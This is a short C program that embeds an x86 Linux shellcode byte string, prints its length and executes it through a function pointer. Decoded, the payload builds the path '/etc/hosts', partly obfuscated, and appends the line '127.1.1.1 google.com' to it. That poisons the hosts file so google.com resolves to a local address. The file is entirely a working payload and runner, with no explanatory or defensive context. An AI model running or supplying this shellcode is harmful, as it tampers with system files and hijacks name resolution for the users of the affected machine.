#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x6a\x05\x59\x89\xc8\x83\xe9\x05\x51\x68\x5e\x62\x63\x62\x5a\x81\xc2\x11\x11\x11\x11\x52\x68\x2f\x2f\x2f\x68\x68\x2f\x65\x74\x63\x89\xe2\x87\xda\x31\xd2\x66\xc7\x44\x24\xfc\x01\x04\x83\xec\x04\x59\xcd\x80\x93\x6a\x04\x58\xeb\x10\x59\x6a\x14\x5a\xcd\x80\x6a\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xeb\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d";


int main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
